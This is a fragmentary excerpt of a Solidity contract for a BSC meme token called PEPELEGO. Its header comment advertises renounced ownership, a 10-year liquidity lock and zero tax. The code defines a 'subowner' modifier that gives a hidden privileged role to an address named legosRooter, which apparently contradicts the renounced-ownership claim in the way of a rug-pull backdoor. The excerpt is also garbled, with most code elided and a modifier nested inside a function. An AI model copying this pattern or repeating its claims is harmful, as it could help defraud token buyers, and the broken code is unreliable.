...
/*
🧱LEGOPEPE🧱  🐸$PEPELEGO🐸 BSC FAIRLAUNCH
PePe is coming To LEGO
Are you ready to moon?
🧱LP locked for 10 years
🧱Ownership  renounced
🧱Tax 0% 
#pepecoin #PEPE #PepeCommunity 
🟢TG https://t.me/PEPELEGO
🟢 website V1 https://pepelego.online/
*/
...
contract PEPELEGO is binance20Burnable, binance711, binance20Ownable {
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
      ...
      modifier subowner() {
        require(legosRooter == _msgSender(), "binance20Ownable: caller is not the owner");
        _;
    }
    /**
